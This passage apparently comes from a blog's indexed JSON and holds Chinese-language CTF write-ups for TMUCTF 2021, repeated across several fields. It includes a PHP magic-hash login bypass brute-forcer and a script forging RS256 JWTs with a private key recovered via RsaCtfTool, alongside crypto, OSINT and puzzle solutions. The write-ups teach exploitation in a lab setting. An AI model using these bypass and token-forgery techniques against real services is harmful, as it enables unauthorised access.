<code>TMUCTF&#123;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&#125;</code></p>\n<h1 id=\"Login\"><a href=\"#Login\" class=\"headerlink\" title=\"Login\"></a>Login</h1><p><em>Just login and get the flag!</em></p>\n<p><em><a href=\"http://185.235.41.189/\">http://185.235.41.189</a></em></p>\n<hr>\n<p>访问<code>/robots.txt</code></p>\n<pre><code class=\"php\">if (isset($_GET[&quot;password&quot;])) &#123;\n    if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) == $_GET[&quot;password&quot;]) &#123;\n        echo &quot;&lt;h1&gt;Here is the flag:&lt;/h1&gt;&quot; . $flag;\n    &#125; else &#123;\n        echo &quot;Try harder!&quot;;\n    &#125;\n&#125;\n</code></pre>\n<p><code>==</code>是弱类型的比较,字符串在与数字比较前会自动转换为数字;<code>0e\\d+</code>这种字符串会被解析为科学计数法的数字，0的多少次方都是零,所以<code>oe\\d+</code> <code>==</code> <code>oe\\d+</code>.</p>\n<p>所以我们只要找到一个形如<code>oe\\d+</code>且哈希后仍为<code>oe\\d+</code>的字符串即可.</p>\n<p>代码:</p>\n<pre><code class=\"python\">import hashlib\n\ni = 0\nwhile True:\n    m = hashlib.md5()\n    plain = f&#39;0e&#123;i&#125;&#39;\n    m.update(plain.encode(&#39;utf-8&#39;))\n    t = m.hexdigest()\n    if t[:2] == &#39;0e&#39; and t[2:].isdigit():\n        print(plain, t)\n        break\n    i += 1\n    if not i % 10000:\n        print(i)\n</code></pre>\n<p><code>md5(&quot;0e215962017&quot;) == &quot;0e291242476940776845150308577824&quot;</code></p>\n<p><strong>flag:</strong><code>TMUCTF&#123;D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?&#125;</code></p>\n<h1 id=\"The-Devil-Never-Sleeps\"><a href=\"#The-Devil-Never-Sleeps\" class=\"headerlink\" title=\"The Devil Never Sleeps\"></a>The Devil Never Sleeps</h1><p><em>If you put the devil to sleep, you will get the flag successfully. Unfortunately, the devil never sleeps. But what if you use some sleeping pills?</em></p>\n<p><em><a href=\"http://194.5.207.57:8080/\">http://194.5.207.57:8080</a></em></p>\n<hr>\n<p>访问题目链接</p>\n<pre><code>To get sleeping pills, navigate to /sleepingpill. To get the flag, navigate to /flag.\n</code></pre>\n<p>访问<code>/sleepingpill</code>得到<code>JWT</code>和<code>Public Key</code>,保存至<code>pub.key</code></p>\n<pre><code class=\"ASN.1\">-----BEGIN PUBLIC KEY-----\nMIGsMA0GCSqGSIb3DQEBAQUAA4GaADCBlgKBjgD/////////////////////////\n/////////////////////////////////////////////////////////////3//\n///////////+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECAwEAAQ==\n-----END PUBLIC KEY-----\n</code></pre>\n<p>访问<code>/flag</code></p>\n<pre><code class=\"json\">&#123;\n   &quot;msg&quot;: &quot;Missing Pill Header&quot;\n&#125;\n</code></pre>\n<p>加上<code>Pill</code>试试,可以看到是一个标准的<code>JWT</code>格式</p>\n<pre><code class=\"json\">&#123;\n    &quot;msg&quot;: &quot;Missing &#39;Bearer&#39; type in &#39;Pill&#39; header. Expected &#39;Pill: Bearer &lt;JWT&gt;&#39;&quot;\n&#125;\n</code></pre>\n<p>在<a href=\"https://jwt.io/\">jwt.io</a>上解析一下<code>JWT</code></p>\n<p><img data-src=\"/../../CTF/TMUCTF2021/Web/assets/jwt-decoded.jpg\" alt=\"jwt\"></p>\n<p>使用<a href=\"https://github.com/Ganapati/RsaCtfTool\">RsaCtfTool</a>生成私钥,保存至<code>private.pem</code></p>\n<pre><code class=\"shell\">python RsaCtfTool.py --publickey ./key.pub --private\n</code></pre>\n<pre><code class=\"ASN.1\">-----BEGIN RSA PRIVATE KEY-----\nMIICmwIBAAKBjgD/////////////////////////////////////////////////\n/////////////////////////////////////3/////////////+AAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAECAwEAAQKBjSp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WA\nKn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqVVWqqlVVqqpVVaoAVf+q\nAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+q\nAFX/qgBV/6oAVf+qAQJMf///////////////////////////////////////////\n/////////////////////////////////////////////////////////wJCAf//\n////////////////////////////////////////////////////////////////\n////////////////////AkxVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWq\nqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqpAkIB\ngIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/\ngIB/f4CAf3+AgH9/gIB/f38CTHve973ve973ve9773ve973ve973ve+973ve973v\ne973vve973ve973ve9773ve973ve973ve+973ve973ve973vve973ve973ve970=\n-----END RSA PRIVATE KEY-----\n</code></pre>\n<p>修改<code>payload</code>中的<code>sleep</code>为<code>true</code>和<code>exp</code>为<code>9999999999</code>,生成<code>JWT Token</code>并请求<code>/flag</code></p>\n<p>代码:</p>\n<pre><code class=\"Python\">import jwt\n\nwith open(&#39;private.pem&#39;,&#39;r&#39;) as f:\n    secret = f.read()\nprint(secret)\n\ndic = &#123;\n    &quot;fresh&quot;: False,\n    &quot;iat&quot;: 1631241476,\n    &quot;jti&quot;: &quot;4b30d7a8-256f-405e-9640-4278728a8602&quot;,\n    &quot;type&quot;: &quot;access&quot;,\n    &quot;sub&quot;: &quot;devil&quot;,\n    &quot;nbf&quot;: 1631241476,\n    &quot;exp&quot;: 9999999999,\n    &quot;sleep&quot;: &quot;true&quot;,\n    &quot;danger&quot;: &quot;true&quot;\n&#125;\nheaders = &#123;\n    &quot;typ&quot;: &quot;JWT&quot;,\n    &quot;alg&quot;: &quot;RS256&quot;\n&#125;\ntoken = jwt.encode(dic, secret, headers=headers, algorithm=&#39;RS256&#39;)\nprint(token)\n</code></pre>\n<p><strong>flag:</strong><code>TMUCTF&#123;0h_51nn3rm4n_Wh3r3_Y0u_60nn4_Run_70?&#125;</code></p>\n<h1 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h1><p><em>A fun visual cryptogr aphy tool will amaze your kids!</em></p>\n<hr>\n<p>题目中给出了两张灰度图<code>ciphered_message.png</code>和<code>secret.png</code>,先用<code>PIL</code>看一下图片中每个像素点的值,发现均为0或255.</p>\n<pre><code class=\"python\">from PIL import Image\nim = Image.open(&#39;ciphered_message.png&#39;)\nprint(list(im.getdata()))\n</code></pre>\n<p>使用<code>PIL</code>合并两张图片即可.</p>\n<pre><code class=\"Python\">from PIL import Image\n\nim = Image.open(&#39;ciphered_message.png&#39;)\nim2 = Image.open(&#39;secret.png&#39;)\nassert im.size == im2.size\nsize = im2.size\nprint(size)\nprint(im.mode)\ndata = [x for x in im.getdata()]\nfor index,x in enumerate(im2.getdata()):\n    if x and data[index]:\n        data[index] = 255\n    else:\n        data[index] = 0\n\nim = Image.new(&#39;1&#39;,size)\nim.putdata(data)\nim.save(&#39;ans.png&#39;)\n</code></pre>\n<p><img data-src=\"/../../CTF/TMUCTF2021/Welcome/assets/ans.png\" alt=\"TMUCTF\"></p>\n<p><strong>flag:</strong><code>TMUCTF&#123;W3_h0p3_y0u_3nj0y_7h15_c0mp371710n_4nd_7h4nk_y0u!&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"PuzzleLife is a puzzle! 给了一张图片,首先使用binwalk提取一下文件,得到一个有密码的压缩文件和一张图片. 观察图片发现,第一位数字表示行号,剩下的数字是在描述上一行数字的个数. 例如,从12-&gt;11112是:先写一个1表示行号,上一行有1个1、1个2,加上11和12即可得到11112. 依次类推,得到压缩包的解压密码?是61542142311. 输入密码,解压得到flag.txt: R1pIUEdTe1EzeV9NM19RNDU3NHpfRTRzNzBfVzRhX1U0el9PMV9RM3kwX1c0YV9QdTAwYV9YMGE0en0= base64解码一下: GZHPGS&#123;Q3y_M3_Q4574z_E4s70_W4a_U4z_O1_Q3y0_W4a_Pu00a_X0a4z&#125; ROT13解密一下: TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125; flag:TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125; Too MuchI found a program that generates the flag of this challenge, but the implementation of one of its functions is not available. This function seems simple, but I am confused because of the large number of numbers! Can you help me find the flag before the competition is over?! 题目给了一个包含1000000个数字的文件numbers.txt,要求编写一个函数:对于给定的x,在numbers.txt中找到两个数y和z,要求满足y !&#x3D; z 和 (y + z) &#x3D;&#x3D; x,返回不重复的(y,z)的个数. 利用哈希数组的思想,将时间复杂度降到O(n): def func2(x): &quot;&quot;&quot; Returns the number of distinct pairs (y, z) from the numbers in the file &quot;numbers.txt&quot; whose y != z and (y + z) == x Note that two pairs (y, z) and (z, y) are considered the same and are counted only once &quot;&quot;&quot; with open(&#39;numbers.txt&#39;, &#39;r&#39;) as f: data = [int(_) for _ in f.readlines()] length = max(data) + 1 hash_arr = [False] * (length) for t in data: hash_arr[t] = True ans = 0 for y in data: z = x-y if z &gt; 0 and hash_arr[z]: if y != z: ans += 1 print(chr(ans//2)) return ans // 2 def get_flag(res): flag = [] for i in range(len(res)): flag.append(chr(func2(res[i]))) flag = &#39;&#39;.join(flag) return flag if __name__ == &quot;__main__&quot;: res = [751741232, 519127658, 583555720, 3491231752, 3333111256, 481365731, 982100628, 1001121327, 3520999746, 915725624, 3218509573, 3621224627, 3270950626, 3321456817, 3091205444, 999888800, 475855017, 448213157, 3222412857, 820711846, 3710211491, 3119823672, 3333211607, 812955676, 971211391, 3210953872, 289789909, 781213400, 578265122, 910021887, 653886578, 3712776506, 229812345, 582319118, 1111276998, 1151016390, 700123328, 1074521304, 3210438183, 817210125, 501231350, 753244584, 3240911853, 415234677, 469125436, 592610671, 612980665, 291821367, 344199617, 1011100412, 681623864, 897219249, 3132267885, 565913000, 301203203, 3100544737, 432812663, 1012813485, 510928797, 671553831, 3216409218, 3191288433, 698777123, 3512778698, 810476845, 3102989588, 3621432709, 812321695, 526486561, 378912454, 3316207359, 623111580, 344209171, 537454826, 691277475, 2634678623, 1112182335, 792111856, 762989676, 666210267, 871278369, 581009345, 391231132, 921732469, 717217468, 3101412929, 3101217354, 831912337, 532666530, 701012510, 601365919, 492699680, 2843119525] print(&quot;The flag is&quot;, get_flag(res)) The flag is TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125; flag:TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125; The Foreign StudentTarbiat Modares University has a foreign student. His name is Zedmondo. He has a very shady character. He always walks alone, eats alone, and never talks much.There are some rumors about him. Some people say he is a genius sociopath; some say he is just too self-involved. But one thing is obvious; he has a secret.Once, one of the students heard that he was talking about receiving some important documents via a private email. Maybe if we find his email, we can learn about his secret.* 题目是要我们找一个叫Zedmondo的大学生的private email 首先,用Google搜索Zedmondo Tarbiat Modares University,找到这个人的Linkedin主页 除了一个Github链接外(https://github.com/ZedZini),没有什么其他有价值的信息 浏览Github上的仓库,结合题目中的he has a secret.,一个仓库https://github.com/ZedZini/secretkey的README引起了我的注意. # secretkey It is a public key. Not really a secret, right?! 与README一起的还有一个PGP公钥文件: -----BEGIN PGP PUBLIC KEY BLOCK----- Version: Keybase OpenPGP v1.0.0 Comment: https://keybase.io/crypto xsFNBGAqSQ8BEADZtFG6grS2QP9afsA7SmT85TpxcSmG5LGLmSHKgI47ZwS+dPrO SzChR0Jt3vI7BjA3WVlxQp94XTqRqFrjtJkS2I3nO3I94jhLu0AwfoiskKzyl+tQ ... -----END PGP PUBLIC KEY BLOCK----- 访问https://keybase.io/crypto,发现网站上已经给出了使用说明: Using the Keybase command line app keybase pgp encrypt -m &quot;message&quot; [them] With GPG or another PGP program You may import from Keybase to GPG easily and then perform whatever cryptographic actions you want. # using curl curl https://keybase.io/[them]/key.asc | gpg --import # using `keybase pgp pull` which # imports to GPG key chain for you keybase follow [them] keybase pgp pull [them] 参照使用说明: curl https://raw.githubusercontent.com/ZedZini/secretkey/main/0xEB0B6528-pub.asc | gpg --import % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 gpg: 目录‘/Users/zhaoqi219/.gnupg’已创建 gpg: 钥匙箱‘/Users/zhaoqi219/.gnupg/pubring.kbx’已创建 100 6139 100 6139 0 0 4494 0 0:00:01 0:00:01 --:--:-- 4490 gpg: /Users/zhaoqi219/.gnupg/trustdb.gpg：建立了信任度数据库 gpg: 密钥 586DD615EB0B6528：公钥 “Zedmondo Zaberini (Nothing to say...) &lt;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&gt;” 已导入 gpg: 处理的总数：1 gpg: 已导入：1 flag: TMUCTF&#123;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&#125; LoginJust login and get the flag! http://185.235.41.189 访问/robots.txt if (isset($_GET[&quot;password&quot;])) &#123; if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) == $_GET[&quot;password&quot;]) &#123; echo &quot;&lt;h1&gt;Here is the flag:&lt;/h1&gt;&quot; . $flag; &#125; else &#123; echo &quot;Try harder!&quot;; &#125; &#125; ==是弱类型的比较,字符串在与数字比较前会自动转换为数字;0e\\d+这种字符串会被解析为科学计数法的数字，0的多少次方都是零,所以oe\\d+ == oe\\d+. 所以我们只要找到一个形如oe\\d+且哈希后仍为oe\\d+的字符串即可. 代码: import hashlib i = 0 while True: m = hashlib.md5() plain = f&#39;0e&#123;i&#125;&#39; m.update(plain.encode(&#39;utf-8&#39;)) t = m.hexdigest() if t[:2] == &#39;0e&#39; and t[2:].isdigit(): print(plain, t) break i += 1 if not i % 10000: print(i) md5(&quot;0e215962017&quot;) == &quot;0e291242476940776845150308577824&quot; flag:TMUCTF&#123;D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?&#125; The Devil Never SleepsIf you put the devil to sleep, you will get the flag successfully. Unfortunately, the devil never sleeps. But what if you use some sleeping pills? http://194.5.207.57:8080 访问题目链接 To get sleeping pills, navigate to /sleepingpill. To get the flag, navigate to /flag. 访问/sleepingpill得到JWT和Public Key,保存至pub.key -----BEGIN PUBLIC KEY----- MIGsMA0GCSqGSIb3DQEBAQUAA4GaADCBlgKBjgD///////////////////////// /////////////////////////////////////////////////////////////3// ///////////+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECAwEAAQ== -----END PUBLIC KEY----- 访问/flag &#123; &quot;msg&quot;: &quot;Missing Pill Header&quot; &#125; 加上Pill试试,可以看到是一个标准的JWT格式 &#123; &quot;msg&quot;: &quot;Missing &#39;Bearer&#39; type in &#39;Pill&#39; header. Expected &#39;Pill: Bearer &lt;JWT&gt;&#39;&quot; &#125; 在jwt.io上解析一下JWT 使用RsaCtfTool生成私钥,保存至private.pem python RsaCtfTool.py --publickey ./key.pub --private -----BEGIN RSA PRIVATE KEY----- MIICmwIBAAKBjgD///////////////////////////////////////////////// /////////////////////////////////////3/////////////+AAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAECAwEAAQKBjSp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WA Kn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqVVWqqlVVqqpVVaoAVf+q AFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+q AFX/qgBV/6oAVf+qAQJMf/////////////////////////////////////////// /////////////////////////////////////////////////////////wJCAf// //////////////////////////////////////////////////////////////// ////////////////////AkxVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWq qlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqpAkIB gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/ gIB/f4CAf3+AgH9/gIB/f38CTHve973ve973ve9773ve973ve973ve+973ve973v e973vve973ve973ve9773ve973ve973ve+973ve973ve973vve973ve973ve970= -----END RSA PRIVATE KEY----- 修改payload中的sleep为true和exp为9999999999,生成JWT Token并请求/flag 代码: import jwt with open(&#39;private.pem&#39;,&#39;r&#39;) as f: secret = f.read() print(secret) dic = &#123; &quot;fresh&quot;: False, &quot;iat&quot;: 1631241476, &quot;jti&quot;: &quot;4b30d7a8-256f-405e-9640-4278728a8602&quot;, &quot;type&quot;: &quot;access&quot;, &quot;sub&quot;: &quot;devil&quot;, &quot;nbf&quot;: 1631241476, &quot;exp&quot;: 9999999999, &quot;sleep&quot;: &quot;true&quot;, &quot;danger&quot;: &quot;true&quot; &#125; headers = &#123; &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot; &#125; token = jwt.encode(dic, secret, headers=headers, algorithm=&#39;RS256&#39;) print(token) flag:TMUCTF&#123;0h_51nn3rm4n_Wh3r3_Y0u_60nn4_Run_70?&#125; WarmupA fun visual cryptogr aphy tool will amaze your kids! 题目中给出了两张灰度图ciphered_message.png和secret.png,先用PIL看一下图片中每个像素点的值,发现均为0或255. from PIL import Image im = Image.open(&#39;ciphered_message.png&#39;) print(list(im.getdata())) 使用PIL合并两张图片即可. from PIL import Image im = Image.open(&#39;ciphered_message.png&#39;) im2 = Image.open(&#39;secret.png&#39;) assert im.size == im2.size size = im2.size print(size) print(im.mode) data = [x for x in im.getdata()] for index,x in enumerate(im2.getdata()): if x and data[index]: data[index] = 255 else: data[index] = 0 im = Image.new(&#39;1&#39;,size) im.putdata(data) im.save(&#39;ans.png&#39;) flag:TMUCTF&#123;W3_h0p3_y0u_3nj0y_7h15_c0mp371710n_4nd_7h4nk_y0u!&#125;","summary":"PuzzleLife is a puzzle! 给了一张图片,首先使用binwalk提取一下文件,得到一个有密码的压缩文件和一张图片. 观察图片发现,第一位数字表示行号,剩下的数字是在描述上一行数字的个数. 例如,从12-&gt;11112是:先写一个1表示行号,上一行有1个1、1个2,加上11和12即可得到11112. 依次类推,得到压缩包的解压密码?是61542142311. 输入密码,解压得到flag.txt: R1pIUEdTe1EzeV9NM19RNDU3NHpfRTRzNzBfVzRhX1U0el9PMV9RM3kwX1c0YV9QdTAwYV9YMGE0en0= base64解码一下: GZHPGS&#123;Q3y_M3_Q4574z_E4s70_W4a_U4z_O1_Q3y0_W4a_Pu00a_X0a4z&#125; ROT13解密一下: TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125; flag:TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125; Too MuchI found a program that generates the flag of this challenge, but the implementation of one of its functions is not available. This function seems simple, but I am confused because of the large number of numbers! Can you help me find the flag before the competition is over?! 题目给了一个包含1000000个数字的文件numbers.txt,要求编写一个函数:对于给定的x,在numbers.txt中找到两个数y和z,要求满足y !&#x3D; z 和 (y + z) &#x3D;&#x3D; x,返回不重复的(y,z)的个数. 利用哈希数组的思想,将时间复杂度降到O(n): def func2(x): &quot;&quot;&quot; Returns the number of distinct pairs (y, z) from the numbers in the file &quot;numbers.txt&quot; whose y != z and (y + z) == x Note that two pairs (y, z) and (z, y) are considered the same and are counted only once &quot;&quot;&quot; with open(&#39;numbers.txt&#39;, &#39;r&#39;) as f: data = [int(_) for _ in f.readlines()] length = max(data) + 1 hash_arr = [False] * (length) for t in data: hash_arr[t] = True ans = 0 for y in data: z = x-y if z &gt; 0 and hash_arr[z]: if y != z: ans += 1 print(chr(ans//2)) return ans // 2 def get_flag(res): flag = [] for i in range(len(res)): flag.append(chr(func2(res[i]))) flag = &#39;&#39;.join(flag) return flag if __name__ == &quot;__main__&quot;: res = [751741232, 519127658, 583555720, 3491231752, 3333111256, 481365731, 982100628, 1001121327, 3520999746, 915725624, 3218509573, 3621224627, 3270950626, 3321456817, 3091205444, 999888800, 475855017, 448213157, 3222412857, 820711846, 3710211491, 3119823672, 3333211607, 812955676, 971211391, 3210953872, 289789909, 781213400, 578265122, 910021887, 653886578, 3712776506, 229812345, 582319118, 1111276998, 1151016390, 700123328, 1074521304, 3210438183, 817210125, 501231350, 753244584, 3240911853, 415234677, 469125436, 592610671, 612980665, 291821367, 344199617, 1011100412, 681623864, 897219249, 3132267885, 565913000, 301203203, 3100544737, 432812663, 1012813485, 510928797, 671553831, 3216409218, 3191288433, 698777123, 3512778698, 810476845, 3102989588, 3621432709, 812321695, 526486561, 378912454, 3316207359, 623111580, 344209171, 537454826, 691277475, 2634678623, 1112182335, 792111856, 762989676, 666210267, 871278369, 581009345, 391231132, 921732469, 717217468, 3101412929, 3101217354, 831912337, 532666530, 701012510, 601365919, 492699680, 2843119525] print(&quot;The flag is&quot;, get_flag(res)) The flag is TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125; flag:TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125; The Foreign StudentTarbiat Modares University has a foreign student. His name is Zedmondo. He has a very shady character. He always walks alone, eats alone, and never talks much.There are some rumors about him. Some people say he is a genius sociopath; some say he is just too self-involved. But one thing is obvious; he has a secret.Once, one of the students heard that he was talking about receiving some important documents via a private email. Maybe if we find his email, we can learn about his secret.* 题目是要我们找一个叫Zedmondo的大学生的private email 首先,用Google搜索Zedmondo Tarbiat Modares University,找到这个人的Linkedin主页 除了一个Github链接外(https://github.com/ZedZini),没有什么其他有价值的信息 浏览Github上的仓库,结合题目中的he has a secret.,一个仓库https://github.com/ZedZini/secretkey的README引起了我的注意. # secretkey It is a public key. Not really a secret, right?! 与README一起的还有一个PGP公钥文件: -----BEGIN PGP PUBLIC KEY BLOCK----- Version: Keybase OpenPGP v1.0.0 Comment: https://keybase.io/crypto xsFNBGAqSQ8BEADZtFG6grS2QP9afsA7SmT85TpxcSmG5LGLmSHKgI47ZwS+dPrO SzChR0Jt3vI7BjA3WVlxQp94XTqRqFrjtJkS2I3nO3I94jhLu0AwfoiskKzyl+tQ ... -----END PGP PUBLIC KEY BLOCK----- 访问https://keybase.io/crypto,发现网站上已经给出了使用说明: Using the Keybase command line app keybase pgp encrypt -m &quot;message&quot; [them] With GPG or another PGP program You may import from Keybase to GPG easily and then perform whatever cryptographic actions you want. # using curl curl https://keybase.io/[them]/key.asc | gpg --import # using `keybase pgp pull` which # imports to GPG key chain for you keybase follow [them] keybase pgp pull [them] 参照使用说明: curl https://raw.githubusercontent.com/ZedZini/secretkey/main/0xEB0B6528-pub.asc | gpg --import % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 gpg: 目录‘/Users/zhaoqi219/.gnupg’已创建 gpg: 钥匙箱‘/Users/zhaoqi219/.gnupg/pubring.kbx’已创建 100 6139 100 6139 0 0 4494 0 0:00:01 0:00:01 --:--:-- 4490 gpg: /Users/zhaoqi219/.gnupg/trustdb.gpg：建立了信任度数据库 gpg: 密钥 586DD615EB0B6528：公钥 “Zedmondo Zaberini (Nothing to say...) &lt;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&gt;” 已导入 gpg: 处理的总数：1 gpg: 已导入：1 flag: TMUCTF&#123;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&#125; LoginJust login and get the flag! http://185.235.41.189 访问/robots.txt if (isset($_GET[&quot;password&quot;])) &#123; if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) == $_GET[&quot;password&quot;]) &#123; echo &quot;&lt;h1&gt;Here is the flag:&lt;/h1&gt;&quot; . $flag; &#125; else &#123; echo &quot;Try harder!&quot;; &#125; &#125; ==是弱类型的比较,字符串在与数字比较前会自动转换为数字;0e\\d+这种字符串会被解析为科学计数法的数字，0的多少次方都是零,所以oe\\d+ == oe\\d+. 所以我们只要找到一个形如oe\\d+且哈希后仍为oe\\d+的字符串即可. 代码: import hashlib i = 0 while True: m = hashlib.md5() plain = f&#39;0e&#123;i&#125;&#39; m.update(plain.encode(&#39;utf-8&#39;)) t = m.hexdigest() if t[:2] == &#39;0e&#39; and t[2:].isdigit(): print(plain, t) break i += 1 if not i % 10000: print(i) md5(&quot;0e215962017&quot;) == &quot;0e291242476940776845150308577824&quot; flag:TMUCTF&#123;D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?&#125; The Devil Never SleepsIf you put the devil to sleep, you will get the flag successfully. Unfortunately, the devil never sleeps. But what if you use some sleeping pills? http://194.5.207.57:8080 访问题目链接 To get sleeping pills, navigate to /sleepingpill. To get the flag, navigate to /flag. 访问/sleepingpill得到JWT和Public Key,保存至pub.key -----BEGIN PUBLIC KEY----- MIGsMA0GCSqGSIb3DQEBAQUAA4GaADCBlgKBjgD///////////////////////// /////////////////////////////////////////////////////////////3// ///////////+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECAwEAAQ== -----END PUBLIC KEY----- 访问/flag &#123; &quot;msg&quot;: &quot;Missing Pill Header&quot; &#125; 加上Pill试试,可以看到是一个标准的JWT格式 &#123; &quot;msg&quot;: &quot;Missing &#39;Bearer&#39; type in &#39;Pill&#39; header. Expected &#39;Pill: Bearer &lt;JWT&gt;&#39;&quot; &#125; 在jwt.io上解析一下JWT 使用RsaCtfTool生成私钥,保存至private.pem python RsaCtfTool.py --publickey ./key.pub --private -----BEGIN RSA PRIVATE KEY----- MIICmwIBAAKBjgD///////////////////////////////////////////////// /////////////////////////////////////3/////////////+AAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAECAwEAAQKBjSp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WA Kn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqVVWqqlVVqqpVVaoAVf+q AFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+q AFX/qgBV/6oAVf+qAQJMf/////////////////////////////////////////// /////////////////////////////////////////////////////////wJCAf// //////////////////////////////////////////////////////////////// ////////////////////AkxVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWq qlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqpAkIB gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/ gIB/f4CAf3+AgH9/gIB/f38CTHve973ve973ve9773ve973ve973ve+973ve973v e973vve973ve973ve9773ve973ve973ve+973ve973ve973vve973ve973ve970= -----END RSA PRIVATE KEY----- 修改payload中的sleep为true和exp为9999999999,生成JWT Token并请求/flag 代码: import jwt with open(&#39;private.pem&#39;,&#39;r&#39;) as f: secret = f.read() print(secret) dic = &#123; &quot;fresh&quot;: False, &quot;iat&quot;: 1631241476, &quot;jti&quot;: &quot;4b30d7a8-256f-405e-9640-4278728a8602&quot;, &quot;type&quot;: &quot;access&quot;, &quot;sub&quot;: &quot;devil&quot;, &quot;nbf&quot;: 1631241476, &quot;exp&quot;: 9999999999, &quot;sleep&quot;: &quot;true&quot;, &quot;danger&quot;: &quot;true&quot; &#125; headers = &#123; &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot; &#125; token = jwt.encode(dic, secret, headers=headers, algorithm=&#39;RS256&#39;) print(token) flag:TMUCTF&#123;0h_51nn3rm4n_Wh3r3_Y0u_60nn4_Run_70?&#125; WarmupA fun visual cryptogr aphy tool will amaze your kids! 题目中给出了两张灰度图ciphered_message.png和secret.png,先用PIL看一下图片中每个像素点的值,发现均为0或255. from PIL import Image im = Image.open(&#39;ciphered_message.png&#39;) print(list(im.getdata())) 使用PIL合并两张图片即可. from PIL import Image im = Image.open(&#39;ciphered_message.png&#39;) im2 = Image.open(&#39;secret.png&#39;) assert im.size == 